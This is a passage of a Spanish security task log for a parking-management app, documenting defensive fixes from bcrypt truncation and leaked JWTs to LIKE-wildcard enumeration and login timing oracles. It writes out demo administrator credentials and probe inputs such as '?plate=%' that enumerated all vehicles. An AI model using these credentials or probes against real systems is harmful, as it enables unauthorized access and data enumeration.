  2. Al **verificar**, una contraseña de 80 bytes servía para entrar con cualquier sufijo.
  3. `truncate_error=True` de passlib **sólo protege al hashear**: al verificar sigue truncando (medido: `verify_password("A" * 80, hash_de_72)` devolvía `True` con el flag puesto). Por eso el límite se comprueba **antes** de comparar, no con la bandera.
- **El arreglo**: un único módulo (`backend/app/core/password_policy.py`) con el límite **en bytes** (que es lo que cuenta bcrypt: «ñ» son 2 bytes), aplicado en el alta, el cambio de contraseña, el reset y el login. `hash_password` **falla** en vez de guardar truncado, y `verify_password` **rechaza** en vez de comparar truncada.
- **Criterios de aceptación**:
  - [x] Medido: `bcrypt.verify("a"*100 + "b", bcrypt.hash("a"*100))` → `True` (truncamiento silencioso).
  - [x] El límite es de **bytes** y vive en **un solo sitio** (`app/core/password_policy.py`).
  - [x] Alta de usuario, cambio de contraseña, reset y login **rechazan** (422) una contraseña de más de 72 bytes, con un mensaje que dice cuántos bytes lleva.
  - [x] `verify_password("A" * 80, hash_de_72)` → `False` (ya no es la misma contraseña).
  - [x] `hash_password` con más de 72 bytes **lanza** en vez de guardar un hash truncado.
  - [x] 5 tests nuevos; prueba inversa: quitando la comprobación, el test del prefijo equivalente **falla**.
  - [x] Consecuencia documentada: una cuenta con una contraseña de más de 72 bytes creada **antes** de este cambio no puede entrar con ella (debe usar «olvidé mi contraseña»). Se acepta: en este repositorio no hay todavía clientes reales.

### T-88 · P1 (seguridad) — 7 vulnerabilidades «high» en las dependencias de producción del frontend

- **Estado**: **completado** — `npm audit --omit=dev` da 0
- **Contexto**: el `package-lock.json` tenía versiones con avisos de seguridad **en el árbol que se envía al navegador**:
  | paquete | versión | aviso |
  |---|---|---|
  | `vue` | 3.5.39 | XSS en `@vue/server-renderer` (CR en el nombre de atributo) |
  | `axios` | 1.18.1 | contaminación de prototipos, ReDoS, inyección de cabeceras, SSRF por redirección |
  | `postcss` | 8.5.16 | denegación de servicio por complejidad cuadrática |
  | `nanoid` | 3.3.15 | bucle infinito con tamaños no positivos |
  | `follow-redirects` | 1.16.0 | cabeceras de credenciales en la redirección |
  | `source-map-js` | 1.2.1 | denegación de servicio por índices del mapa de fuentes |
- **Medido**: `npm audit --omit=dev` → **7 vulnerabilidades «high»** y **0 «critical»**; con las de desarrollo, 22.
- **El arreglo**: `npm audit fix` (sin `--force`: `--force` instalaba **tailwindcss 4**, un cambio incompatible que no se hace a ciegas). Los rangos de `package.json` **no cambiaron**: sólo se actualizó el lockfile, así que `npm ci` sigue siendo reproducible.
- **Criterios de aceptación**:
  - [x] Medido: 7 avisos «high» en el árbol de producción antes; **0 después** (`npm audit --omit=dev`).
  - [x] `package.json` **no se toca**: el arreglo cabe en los rangos que ya había.
  - [x] `npm run lint`, `npx vue-tsc --noEmit` y `npm run build` en verde con el lockfile nuevo.
  - [x] Las 11 vulnerabilidades que quedan son **sólo de desarrollo** (vite, tailwind 3, eslint): su arreglo exige migraciones mayores (tailwind 4, vite 8) y **no viajan al cliente**. Se **informan**, no se ocultan (ver T-89).

### T-89 · P1 (seguridad) — ninguna puerta miraba las vulnerabilidades de las dependencias

- **Estado**: **completado** — nueva puerta `tools/verificar_dependencias.py` (con autoprueba) conectada al CI
- **Contexto**: el repo no miraba **nunca** las vulnerabilidades de sus dependencias. Eso es lo que dejó pasar T-88 y T-90: dos cosas de verdad, y ninguna se vio porque nadie miraba.
- **Qué mide**:
  - **Alcance fatal**: las dependencias **directas** que declara `backend/pyproject.toml` (26) y el árbol de **producción** del `package-lock.json` (55, directos y transitivos: es lo que se envía al navegador, y el lockfile fija las versiones exactas).
  - **Alcance informativo**: el resto del árbol transitivo del backend (65 paquetes) y las dependencias de desarrollo del frontend. Se **informan** con el número de avisos y la versión que los arregla, pero no rompen la puerta: no son una decisión nuestra y **el backend no tiene lockfile** (las versiones dependen de cuándo se construyó la imagen).
  - **El ajuste del alcance está medido**: mirando *todo* lo instalado la puerta daba **260 avisos** de los que sólo 68 eran reales (el resto, paquetes del host ajenos al proyecto). Mirando el árbol transitivo entero daba **119**, de los que 69 eran de dependencias directas. Una puerta que grita de más es una puerta que nadie mira.
- **Fuente de verdad**: **OSV** (la base que alimenta `pip-audit` y `npm audit`). Los avisos vienen duplicados (el mismo problema con un identificador `GHSA-…` y otro `PYSEC-…`): se **agrupan por alias en los dos sentidos** y cada problema cuenta **una vez**.
- **Las excepciones**: `tools/dependencias_aceptadas.json`. Cada entrada necesita un **motivo** y una **prueba**; una excepción sin motivo hace **fallar** la puerta. Hoy hay una: `python-jose` (GHSA-3qf3-8w2g-rqmx / CVE-2026-85394), que **no tiene versión arreglada** pero **no es alcanzable** porque el despliegue es de clave compartida (HS256), `decode_token` restringe los algoritmos y **la configuración ahora rechaza cualquier algoritmo que no sea HS256** (`app/core/config.py`). La prueba son los 6 tests de `backend/tests/test_jwt_algoritmos.py`.
- **Criterios de aceptación**:
  - [x] **Medido contra el repo real**: la puerta daba 69 avisos en el alcance fatal antes de arreglar T-90 y da **1** ahora (el justificado).
  - [x] `ruff` y `mypy` en verde; la autoprueba tiene **7 casos** y **falla** si la lógica de detección se rompe (dos de ellos los encontró la propia autoprueba: el agrupado de alias no unía en los dos sentidos, y el aviso transitivo no se informaba).
  - [x] Si OSV no responde, la puerta devuelve el **código 3** («no comprobado»), que **no** es verde.
  - [x] Conectada al CI (job `backend`, paso propio), a `tools/verificar_repo.py` (25 comprobaciones) y a `tools/autopruebas.py` (24 autopruebas).
  - [x] El paso del CI va **después** de instalar las dependencias (mira las versiones **instaladas**, no los rangos).

### T-90 · P1 (seguridad) — Pillow 10.4.0 con 68 avisos, alcanzable por las fotos de los incidentes

- **Estado**: **completado** — Pillow 13.0.0 en el host y en la imagen del contenedor
- **Contexto**: el backend **abre las imágenes que suben los usuarios** (`app/services/incident_attachments.py`: valida la firma y decodifica con Pillow, y genera la miniatura). El pin era `pillow>=10.0,<11.0`: la mayor versión mayor **nunca** ha estado libre de avisos.
- **Medido** (2026-10-23, OSV):
  | versión | avisos |
  |---|---|
  | 10.4.0 (la instalada) | **68** |
  | 11.3.0 | 74 |
  | 12.3.0 | 39 |
  | **13.0.0** | **0** |
  Entre los 68: bombas de descompresión, desbordamientos de búfer en la decodificación de TIFF/PSD/HEIF, bucles infinitos en TIFF y PDF, y evasión de la protección de descompresión. Todos en el camino que ejecuta una **foto de un incidente**.
- **El arreglo**: pin a `pillow>=13.0.0,<14.0` (la primera versión sin ningún aviso). La imagen del contenedor se **reconstruyó** y se comprobó dentro: `Pillow en el contenedor: 13.0.0`.
- **Efecto secundario útil**: los tipos que trae Pillow 13 hicieron **fallar `mypy --strict`** en `generar_miniatura()` (`Image.open` devuelve `ImageFile` y `convert` devuelve `Image`; el código reasignaba la misma variable con las dos cosas). Arreglado con una variable aparte: era un bug de tipos **latente** que el CI no miraba porque la versión anterior no traía stubs.
- **Criterios de aceptación**:
  - [x] Medido: 68 avisos en 10.4.0 y **0** en 13.0.0 (consultado en OSV).
  - [x] La imagen del contenedor **reconstruida** y verificada por dentro: `Pillow en el contenedor: 13.0.0`.
  - [x] Los 23 tests de adjuntos pasan con Pillow 13 (compatibilidad de la API comprobada, no supuesta).
  - [x] `mypy --strict` en verde (con el arreglo del tipo de `generar_miniatura`).
  - [x] El pin de `pytest` sube a `>=9.0.3` (las 8.x tienen un aviso de manejo del `tmpdir` que se arregla en la 9.0.3).



### T-91 · P1 (seguridad) — el JWT acababa en texto claro en los logs de acceso

- **Estado**: **completado** — ni nginx ni el backend escriben la query string
- **Contexto**: para las miniaturas de los adjuntos y para el stream MJPEG, el frontend mete el token **en la query string** (un `<img>` no puede mandar cabeceras `Authorization`). Con el log por defecto, esa URL va entera al log de acceso.
- **Medido** (2026-10-23, contra la imagen de producción y contra el contenedor real):
  ```
  nginx:   "GET /api/v1/incidents/attachments/1/thumbnail?token=SEGRETO_MEDIDO_12345 HTTP/1.1" 401
  backend: "GET /api/v1/incidents/attachments/1/thumbnail?token=SEGRETO_MEDIDO_12345 HTTP/1.1" 401
  ```
  Y de ahí al fichero que scrapea Promtail y a Loki. Un access token son 15 minutos de vida **con permisos de administrador**: en un log es una credencial caducada, pero da acceso a lo que quede de ella y enseña la estructura de la API a quien lea el log.
- **El arreglo** (dos sitios):
  1. **nginx**: un `log_format` propio (`app_sin_query`) que escribe `$uri` —la ruta **sin** la query string— en lugar de `$request`. Se sigue viendo qué se pidió, sin la credencial.
  2. **el backend**: un filtro en el logger `uvicorn.access` (`app/core/logging.py`) que quita la query string de la ruta antes de escribirla. Va sobre los **argumentos** del registro (no sobre el texto ya formateado), así que si uvicorn cambiara el formato el filtro no rompe nada… y el test, que usa el `AccessFormatter` de verdad, se entera.
- **Criterios de aceptación**:
  - [x] Medido: el token aparecía **en los dos** logs (nginx y uvicorn).
  - [x] **Medido después del arreglo**: `"GET /api/v1/incidents/attachments/1/thumbnail HTTP/1.1" 401` — sin query string, en los dos.
  - [x] 3 tests nuevos (`backend/tests/test_access_log.py`) que pasan por el **logger de verdad** y con el formateador de uvicorn.
  - [x] Prueba inversa: sin el filtro, el test **falla**.
  - [x] Una ruta sin query string se escribe igual (el filtro no toca lo que no debe).

### T-92 · P1 (despliegue) — el backend se publicaba en `0.0.0.0` y se saltaba nginx

- **Estado**: **completado** — todo el compose se publica en `127.0.0.1`
- **Contexto**: el compose publicaba el backend con `"8000:8000"`, que en Docker significa **todas las interfaces**. La API contestaba a cualquiera que llegara por la red de la sucursal, **sin TLS** y **sin pasar por nginx** (y con él, su único límite de cuerpo de 32 MB y sus cabeceras de seguridad). El compose de producción **no** lo corregía: heredaba los puertos del de desarrollo.
- **Medido**: `docker compose config` resolvía `published: "8000"` **sin `host_ip`** (0.0.0.0) para el backend, mientras que la base de datos, Redis, Grafana y Loki ya usaban `127.0.0.1`.
- **El arreglo**: `127.0.0.1:8000:8000` en el compose de desarrollo, y en el de producción **además** un `ports: !override` para el backend (que antes heredaba el puerto abierto) y `127.0.0.1:5173:80` para el nginx de la sucursal, cuyo tráfico entra por el terminador de TLS de la misma máquina.
- **Dentro de la red de Docker nada cambia**: el proxy de nginx, el worker de Celery y los contenedores del OCR siguen hablando con `backend:8000` por el nombre del servicio.
- **Criterios de aceptación**:
  - [x] Medido: el backend se publicaba en `0.0.0.0` (`docker compose config` sin `host_ip`).
  - [x] `docker compose config` resuelve **todos** los puertos publicados con `host_ip: 127.0.0.1`.
  - [x] El compose de producción **overridea** los puertos del backend (antes los heredaba abiertos).
  - [x] La QA visual y la puerta del servidor de producción siguen hablando con `127.0.0.1` (no cambian).



### T-93 · P2 (datos) — la búsqueda de matrículas tenía comodines LIKE sin escapar

- **Estado**: **completado** — los comodines se escapan y el patrón tiene un límite
- **Contexto**: el filtro era `Vehicle.plate.ilike(f"%{plate}%")`, con el texto del usuario **metido en el patrón**. Eso convierte los comodines de LIKE en comodines de verdad.
- **Medido**: `?plate=%` devolvía **todos** los vehículos de la flota y `?plate=______` hacía wildcard sobre cualquier matrícula de 6 caracteres. Con un rol de staff (admin, gestor u operador) la «búsqueda» era un comodín para enumerar las matrículas enteras y para escanear la tabla.
- **Lo que NO era**: inyección SQL. El valor sigue yendo **ligado** como parámetro (SQLAlchemy lo escapa); lo que faltaba era escapar los comodines **del propio LIKE**.
- **El arreglo**: `_escapar_like()` (en `backend/app/api/v1/vehicles.py`) escapa `\`, `%` y `_`, y la consulta usa `escape="\"`. Además el parámetro tiene un límite de 16 caracteres (el mismo que el modelo): un patrón enorme no es una búsqueda de matrículas.
- **Criterios de aceptación**:
  - [x] Medido: `?plate=%` devolvía la flota entera; `?plate=______` hacía wildcard.
  - [x] `?plate=%` devuelve **0** vehículos (el `%` se busca como carácter literal) y `?plate=______` también.
  - [x] Una matrícula que **de verdad** lleva un `%` se encuentra con `?plate=%` (el comodín literal sigue sirviendo para lo que es).
  - [x] La búsqueda normal (`?plate=34AB` → `1234ABC`) sigue funcionando.
  - [x] Un patrón de más de 16 caracteres se rechaza con 422.
  - [x] 5 tests nuevos; prueba inversa: sin el escapado, **3** de ellos fallan.

### T-94 · P1 (disponibilidad) — el correo de reset se enviaba dentro del request

- **Estado**: **completado** — el envío va en una tarea de Celery y la respuesta tiene suelo de latencia
- **Contexto**: `POST /auth/forgot-password` **enviaba el correo antes de responder**. El envío es un `smtplib.SMTP(..., timeout=5)`: con el SMTP lento o caído, la petición se quedaba **5 segundos** bloqueando un worker de la API. Con varias peticiones simultáneas, el pool de workers se agotaba: el mismo endpoint era un vector de denegación de servicio.
- **Medido** (2026-10-23, con un SMTP de mentira que acepta la conexión y no contesta nunca):
  ```
  enviado=False  duracion=5.03 s
  ```
- **Y además era un oráculo**: con la cuenta existente la respuesta tardaba hasta 5 s; sin la cuenta, era instantánea. El endpoint dizia qué correos están registrados sin fallar ni un intento.
- **El arreglo** (dos cosas):
  1. **el envío sale del request**: una tarea de Celery (`solidapp.send_password_reset_email`) manda el correo. Si el broker está caído, se envía en línea (más lento, pero llega): es el camino de emergencia.
  2. **suelo de latencia**: la respuesta tarda siempre lo mismo (350 ms), exista o no la cuenta. Sin él, la diferencia entre «hay cuenta» (unas milésimas más) seguiría siendo medible.
- **Criterios de aceptación**:
  - [x] Medido: el envío bloqueaba el request **5,03 s** con el SMTP lento.
  - [x] El endpoint **encola** el envío y **no** toca el SMTP (verificado con un espía).
  - [x] La respuesta tarda **≥ 350 ms** exista o no la cuenta, y la diferencia entre los dos casos es **< 150 ms**.
  - [x] **Probado en el contenedor real**: `codigo=200 tiempo=0.356s`, y el worker registra `Task solidapp.send_password_reset_email [...] received` → `send_password_reset_email[dry-run]: to=...` → `succeeded`.
  - [x] Si el envío falla, la tarea **borra el token**: un token que el usuario nunca recibió no debe quedar válido.
  - [x] La puerta de tareas de Celery sigue en verde y reconoce la tarea nueva como despachada.
  - [x] 4 tests nuevos; prueba inversa: sin el encolado y sin el suelo, los tests **fallan**.
  - [x] Los 27 tests que ya había del flujo de reset siguen pasando (el seam que interceptan pasa a ser el encolado).



### T-95 · P2 (privacidad) — la retención de las fotos no se aplicaba al descargarlas

- **Estado**: **completado** — la caducidad se aplica al leer y la purga está programada
- **Contexto**: al subir un adjunto se calcula su `expires_at` (90 días por defecto, por minimización de datos: LOPDGDD). Pero **nadie lo comprobaba al descargarlo**: la foto se servía igual aunque su plazo hubiera vencido. Y la purga era un script manual (`python -m app.scripts.purge_incident_attachments`) que nadie se acordaba de lanzar: la retención existía en el papel y no en los hechos.
- **El arreglo** (dos mitades, y el mismo criterio en las dos):
  1. **al leer**: la descarga y la miniatura devuelven **410 Gone** si el adjunto ha caducado. El `DELETE` **sí** puede borrar uno caducado (para eso está: para limpiarlo).
  2. **al purgar**: una tarea de Celery (`solidapp.purge_incident_attachments`) en el `beat_schedule` (diario, a las 3:17) borra los caducados y sus ficheros.
- **El criterio es uno solo**: la purga filtraba por `created_at < ahora - retención` y el endpoint no miraba nada. Dos criterios para la misma regla es como se rompe una regla: ahora los dos usan `expires_at` (y los adjuntos antiguos sin `expires_at` se purgan por su fecha de creación, para que no se queden ahí para siempre).
- **Criterios de aceptación**:
  - [x] Un adjunto caducado da **410** en la descarga y en la miniatura; uno vigente se sigue sirviendo (200).
  - [x] El `DELETE` de un adjunto caducado sigue funcionando (204).
  - [x] La tarea programada borra los caducados y **no toca** los que están en plazo.
  - [x] La tarea está en el `beat_schedule` y la puerta de tareas de Celery la reconoce.
  - [x] 5 tests nuevos; prueba inversa: sin la comprobación de caducidad, el test **falla**.
  - [x] Ojo con las fechas: SQLite no guarda la zona horaria, así que el `datetime` vuelve «naive» y hay que normalizarlo antes de compararlo (el mismo ajuste que hace el resto del repo).



### T-96 · P1 (dato personal) — la lectura de las fotos de incidentes no dejaba rastro

- **Estado**: **completado** — la descarga y la miniatura se auditan
- **Contexto**: la auditoría registraba la **subida** (`incident_attachment_uploaded`) y el **borrado** (`incident_attachment_deleted`) de las fotos de un incidente, pero **no la lectura**.
- **Por qué no era cosmético**: una foto de un incidente es dato personal (matrícula, y a veces personas). La auditoría decía quién subió una foto y quién la borró, pero **no quién la vio** — y en un incidente por una matrícula, esa es justamente la pregunta que se hace en una revisión (LOPDGDD).
- **El arreglo**: los dos endpoints que sirven los bytes (el original y la miniatura) dejan una fila de auditoría con **quién** (`user_id`), **desde dónde** (la IP real del cliente, no la del proxy: T-62) y **qué** foto (`attachment_id`, `alert_id`, mime y tamaño). Lo que **no** se sirve (un 403 por ser de otra sucursal) **no** se audita: ni ruido ni rastro falso.
- **Criterios de aceptación**:
  - [x] La descarga deja una fila `incident_attachment_downloaded` con el usuario, la IP y la foto.
  - [x] La miniatura deja `incident_attachment_thumbnail_viewed` (es la misma foto, reducida).
  - [x] Un intento que no pasa (403 por sucursal) **no** deja rastro.
  - [x] 3 tests nuevos; prueba inversa: sin la llamada a la auditoría, los tests **fallan**.

### T-97 · P2 (fuga de información) — la API devolvía la ruta del PDF en el disco del servidor

- **Estado**: **completado** — el PDF se sirve por la API y la ruta interna no sale
- **Contexto**: la respuesta de los tickets incluía `pdf_path`: la ruta **del servidor** (`/tmp/solidapp-tickets/ticket-1.pdf`). El botón «Descargar PDF» del panel del cliente apuntaba a esa ruta, así que:
  1. **daba 404** (ese fichero vive en el contenedor del backend y no lo servía nadie): la función estaba rota;
  2. la respuesta de la API enseñaba la estructura de ficheros del servidor (dónde están los temporales y cómo se llaman).
- **El arreglo** (tres piezas):
  1. **un endpoint** `GET /tickets/{id}/pdf` que **genera el PDF al vuelo** y lo sirve con `application/pdf`, `Content-Disposition: attachment` y `nosniff`. El scope es el **mismo** que el detalle del ticket: un cliente solo descarga los PDF de sus vehículos;
  2. la API ya **no devuelve la ruta**: en su lugar, `pdf_available` (si el ticket está cerrado, hay PDF);
  3. el frontend **pide el PDF a la API** con `fetch` (un `<a href>` no puede mandar la cabecera `Authorization`), en vez de enlazar el fichero.
- **Medido** (2026-10-23, contra la API real en marcha): antes, la respuesta del ticket traía `pdf_path`; ahora trae `pdf_available: true` y `GET /tickets/1/pdf` → **200**, `application/pdf`, 2669 bytes que empiezan por `%PDF`.
- **Criterios de aceptación**:
  - [x] La API no devuelve `pdf_path` ni en el ticket ni en el panel del cliente.
  - [x] `GET /tickets/{id}/pdf` devuelve el PDF (200, `%PDF`, `attachment`, `nosniff`).
  - [x] Un cliente **no** puede descargar el PDF de otro (404, y no se revela ni que existe).
  - [x] El botón del panel del cliente funciona (descarga con la cabecera `Authorization`).
  - [x] `lint`, `vue-tsc` y `mypy` en verde.
  - [x] 5 tests nuevos; prueba inversa: devolver `pdf_path` o quitar el scope **hacen fallar** los tests.

### T-98 · P2 (seguridad) — las cuentas de demostración se podían loguear en producción

- **Estado**: **completado** — en staging/producción no entran
- **Contexto**: el seed ya se niega a crear las cuentas de demostración fuera de desarrollo (T-83), pero **el login no las filtraba**: si la base de datos de una sucursal arrastraba cuentas de una instalación de desarrollo (un dump, una copia, una restauración vieja), las credenciales **públicas de este repositorio** (y del README: `admin@solidapp.es` / `admin12345`) servirían para entrar como administrador.
- **El arreglo**: el login rechaza esas cuentas en `staging`/`production`. El rechazo es un **401 como el de cualquier contraseña incorrecta** (un 403 distinto, tipo «cuenta de demostración», diría que ese correo existe: el mismo oráculo que T-86 tapa). En `development`/`test` no se bloquea: la QA visual y el botón «rellenar demo» de la pantalla de login las usan a propósito.
- **Medido** (2026-10-23, backend real levantado con `ENVIRONMENT=production`):
  | login | antes | ahora |
  |---|---|---|
  | `admin@solidapp.es` / `admin12345` | **200** (con token de administrador) | **401** |
  | `admin.real@solidapp.es` (una cuenta normal) | 200 | **200** (no se bloquea de más) |
  Y el intento queda auditado con `reason=demo_account`.
- **Criterios de aceptación**:
  - [x] En `production` y `staging` la cuenta demo da 401 (y no un 403, para no revelar que existe).
  - [x] En `development` la cuenta demo **sí** entra (la QA depende de ello).
  - [x] Un correo que no es de demo no se bloquea.
  - [x] El intento queda auditado con su motivo (`demo_account`).
  - [x] 5 tests nuevos; prueba inversa: sin el bloqueo, el test **falla**.


### T-99 · P2 (usabilidad y datos) — el login comparaba el correo en bruto

- **Estado**: **completado** — una forma canónica para el correo, al escribir y al comparar
- **Contexto**: el correo **no distingue** mayúsculas de minúsculas (en la práctica ningún proveedor de correo las distingue), pero el código comparaba el texto **tal como se escribía**: `User.email == payload.email`.
- **Medido** (2026-10-23, contra la API real en marcha):
  | login | antes | ahora |
  |---|---|---|
  | `Gestor.Mixto@solidapp.es` (como se guardó) | 200 | 200 |
  | `gestor.mixto@solidapp.es` | **401** | **200** |
  | `GESTOR.MIXTO@solidapp.es` | **401** | **200** |
  | `ADMIN@solidapp.es` (usuario normal, tecleado en mayúsculas) | **401** | **200** |
  O sea: **el mismo correoDepending de cómo lo escribieras**, y un usuario que teclea en mayúsculas se queda fuera sin entender por qué.
- **El arreglo, de raíz** (tres piezas):
  1. **al escribir**: el alta de usuarios y de operadores guarda el correo **canónico** (sin espacios y en minúsculas), con un validador del esquema;
  2. **al comparar**: login, «olvidé mi contraseña», el alta de operadores y la búsqueda de usuario por correo comparan en forma canónica (así las cuentas **ya guardadas** en mayúsculas siguen entrando);
  3. **en la base de datos**: un índice **único sobre `lower(email)`** (migración `0015_email_canonico`), que además canonicaliza los correos existentes. Sin él se podrían crear dos cuentas que solo se diferencian en cómo están escritas, y el login (que ya compara canónico) las confundiría.
- **Criterios de aceptación**:
  - [x] Medido: las tres formas del mismo correo dan 401 antes y 200 ahora; `ADMIN@solidapp.es` también.
  - [x] El alta guarda el correo canónico (`Nuevo.Gestor@Solidapp.ES` → `nuevo.gestor@solidapp.es`).
  - [x] Dos cuentas que solo se diferencian en las mayúsculas: la segunda rebota con **409** (el índice único de la base lo prohibe).
  - [x] «Olvidé mi contraseña» encuentra la cuenta con el correo en mayúsculas.
  - [x] La puerta de migraciones (`alembic check`): **«el esquema migrado coincide con los modelos»**.
  - [x] 4 tests nuevos; prueba inversa: sin la normalización al escribir o al comparar, los tests **fallan**.


### T-100 · P0 (disponibilidad) — los informes no tenían tope de filas ni de ventana

- **Estado**: **completado** — ventana acotada, filas acotadas y rate-limit por actor
- **Contexto** (auditoría del 2026-10-23): los exportes de informes pedían **todo** lo que les pedían, sin ningún tope:
  1. la **ventana** no tenía límite: un gestor podía pedir 30 años;
  2. el **informe de ocupación** cargaba **TODA la historia** de la sucursal (el filtro se hacía en Python, no en SQL): pedir un informe de una hora traía los tickets de tres años en memoria;
  3. el PDF multiplica las filas por los objetos del dibujo.
- **Por qué es P0**: el efecto no es un informe lento, es el **proceso de la API sin memoria** — y si la API se queda sin memoria, se cae **entera** (no solo los informes). Y lo puede pedir un usuario autenticado cualquiera con un rol de gestor.
- **El arreglo** (tres topes):
  1. **ventana**: como máximo **366 días**; más que eso → 422 con el motivo;
  2. **filas**: como máximo **20.000** por informe; más que eso → 413. Y **no** se recorta en silencio: un informe truncado sin avisar es peor que uno que no se genera;
  3. **rate-limit por actor** en todo el router de informes (dependencia del router: una sola implementación, no once copias — el mismo patrón que el rate-limit único de T-69);
  4. y el **informe de ocupación filtra en SQL** (`exit_at IS NULL OR exit_at > to`): solo carga los tickets que siguen abiertos en el instante de la foto.
- **Medido** (2026-10-23, contra la API real en marcha):
  | ventana | antes | ahora |
  |---|---|---|
  | 1 día | 200 | 200 |
  | 30 días | 200 | 200 |
  | 10 años | **200** (toda la historia en memoria) | **422** |
- **Criterios de aceptación**:
  - [x] Una ventana de más de 366 días se rechaza con 422 (medido: 10 años → 422).
  - [x] Un informe que supera el tope de filas se rechaza con **413** (y no se recorta en silencio).
  - [x] El informe de ocupación **sigue diciendo lo mismo** (que es lo que hay que comprobar al acotar: un ticket cerrado de hace un año no ocupa, y el abierto sí).
  - [x] Los informes tienen rate-limit por actor (31 peticiones seguidas → 429).
  - [x] 5 tests nuevos; prueba inversa: sin el tope de ventana o sin el de filas, los tests **fallan**.

### T-101 · P0 (disponibilidad) — seis servicios se quedaban caídos si morían

- **Estado**: **completado** — `restart: unless-stopped` en todos los servicios
- **Contexto** (auditoría del 2026-10-23): el compose tenía la política de reinicio en **6 servicios** (ocr, vehicle-detector, loki, promtail, grafana) pero **no** en `db`, `redis`, `backend`, `frontend`, `celery-worker` ni `celery-beat`. Sin `restart`, un servicio que se cae (un OOM, un SIGKILL, un bug) **se queda caído** hasta que alguien lo levante a mano.
- **Por qué es lo más grave con el worker**: con `task_acks_on_failure_or_timeout` (el defecto de Celery), las tareas que estaban en curso **no se reintentan**; el beat sigue publicando cada 60 s; la cola de Redis crece sin que nadie la consuma; y no hay ni alertas de cámara caída ni detección de matrículas.
- **El arreglo**: `restart: unless-stopped` en los seis servicios que faltaban (y también en el compose de producción, que es un *override* del de desarrollo: los servicios los define el de desarrollo).
- **Vigilado por una puerta**: `tools/verificar_compose_produccion.py` comprueba ahora que **todo** servicio tiene `restart: unless-stopped`, con su caso de mentira (un compose con un servicio sin la política → la puerta falla ✓).
- **Criterios de aceptación**:
  - [x] Medido: 6 servicios sin política de reinicio (db, redis, backend, frontend, celery-worker, celery-beat).
  - [x] Los 6 la tienen ahora, y la puerta del compose lo vigila.
  - [x] La autoprueba de la puerta tiene el caso de mentira: un servicio sin la política → **falla**.

### T-102 · P1 (fiabilidad) — dos rondas de heartbeat podían solaparse

- **Estado**: **completado** — lock por tarea en Redis (`SET NX`)
- **Contexto** (auditoría del 2026-10-23): el beat lanza `probe_heartbeats` **cada 60 s**, pero una ronda puede tardar más (una cámara colgada hace que FFmpeg tarde en abandonar el RTSP; además el `asyncio.run` de Python 3.11 **espera a los hilos** del executor aunque su `wait_for` ya haya expirado). Con dos rondas a la vez:
  - el contador de fallos de cada cámara se incrementaba **dos veces por minuto**, así que la alerta de cámara caída saltaba al **doble** de tiempo del configurado;
  - se duplicaban las filas de auditoría y los eventos publicados;
  - dos rondas podían tomar a la vez el lock de alerta de una cámara: el `SET NX` es atómico, pero la secuencia `INCR → comprobar → SET NX → borrar contador → INSERT` **no lo es**, y si el `INSERT` fallaba la cámara se quedaba muda una hora.
- **El arreglo**: la tarea toma un lock en Redis (`SET NX EX 120`, dos veces el intervalo del beat) y, si ya hay una ronda en curso, **se omite** y lo dice (`{"omitida": True, "motivo": "ronda_en_curso"}`). Si Redis no responde, la tarea **no** se bloquea (sin Redis no hay ni colas ni rate-limit): avisa y sigue.
- **Y el lock se suelta al terminar** (comparación atómica con Lua: solo se suelta el nuestro). Sin esa suelta, el lock se quedaba hasta caducar y, como el beat lanza cada 60 s, **se perdía una ronda de cada tres**. Lo cazaron los tests de `probe_heartbeats` (devolvían `{"omitida": True}` en vez del resultado normal).
- **Criterios de aceptación**:
  - [x] Con el lock tomado, la ronda se omite y lo dice.
  - [x] Sin lock, la ronda se ejecuta como siempre (no se ha roto nada).
  - [x] El lock es `SET NX` (dos rondas no lo toman las dos) y **caduca** (para que un worker muerto no bloquee las rondas siguientes).
  - [x] 4 tests nuevos; prueba inversa: sin el lock, el test **falla**.
  - [x] El lock **se suelta** al terminar la ronda: si no, se perdía una de cada tres (lo cazaron los tests de `probe_heartbeats`).


### T-103 · P1 (disponibilidad) — el SMTP estaba dentro de la ronda de heartbeat y de los requests

- **Estado**: **completado** — el correo de alerta lo manda el worker, no quien lo encola
- **Contexto** (auditoría del 2026-10-23): el envío del correo de alerta era **síncrono** y estaba en dos sitios dentro de un camino que no puede esperar:
  1. dentro de la **ronda de heartbeat** (una alerta por cámara caída);
  2. dentro del **request** que crea un incidente (`POST /incidents`).
  El SMTP tiene un timeout de 5 s: con el SMTP lento o caído, cada alerta costaba el tiempo de espera.
- **Medido** (2026-10-23, con un SMTP de mentira que acepta la conexión y no contesta nunca):
  | | antes | después |
  |---|---|---|
  | 3 alertas CAMERA_OFFLINE | **7,25 s** (2,42 s por alerta) | **0,01 s** |
  Con 50 cámaras caídas, la ronda tardaba más de dos minutos (y el beat la lanza cada 60 s: se solapaba sola).
- **El arreglo**: el correo se **encola** en una tarea de Celery (`solidapp.send_alert_email`) y lo manda el worker, que es quien puede tardar sin que nadie se entere. Si el broker está caído, se manda en línea (camino de emergencia, más lento pero llega).
- **Y un detalle que salió al medir**: al publicar el mensaje, Celery abría conexión con el **result store** (Redis) para reservar sitio para el resultado. Si ese Redis no responde, la llamada se quedaba reintentando: **23 s** por envío (peor que el SMTP que se quería quitar) y el que encolaba se quedaba bloqueado. Por eso las tareas de «dispara y olvida» (`send_alert_email`, `send_password_reset_email`) van con `ignore_result=True`.
- **Criterios de aceptación**:
  - [x] Medido: 7,25 s por tres alertas antes, **0,01 s** después (la ronda no toca la red).
  - [x] La alerta **encola** el correo y **no** lo manda en línea (con el SMTP sustituido por un espía que falla si se llama).
  - [x] La tarea manda el correo de verdad, con la alerta leída de la base de datos.
  - [x] Si la alerta ya no existe, la tarea no rompe nada.
  - [x] Las tareas de fire-and-forget tienen `ignore_result=True` (sin result store al publicar).
  - [x] 4 tests nuevos; prueba inversa: si el correo se vuelve a mandar en línea, el test **falla**.


### T-105 · P2 (datos) — dos tickets activos del mismo vehículo (doble cobro)

- **Estado**: **completado** — la base de datos lo prohíbe (índice único parcial)
- **Contexto** (auditoría del 2026-10-23): la ingesta comprueba antes de insertar («este vehículo ya tiene ticket activo en este parking») y después inserta. Eso es un **«comprueba y luego hace»**: dos pushes de la misma matrícula a la vez (dos rondas solapadas, o dos peticiones simultáneas) podían pasar las dos comprobaciones y crear **DOS tickets activos** → el cliente **cobraba dos veces**.
- **El arreglo**, en la raíz y no en el código:
  1. **dos índices únicos parciales** en la base de datos: `uq_tickets_activo_vehiculo` sobre `(vehicle_id, parking_id) WHERE status = 'activo'` y `uq_tickets_activo_plaza` sobre `parking_space_id WHERE status = 'activo'` (migración `0016_ticket_activo_unico`). Lo único que una carrera no puede saltar es la base de datos;
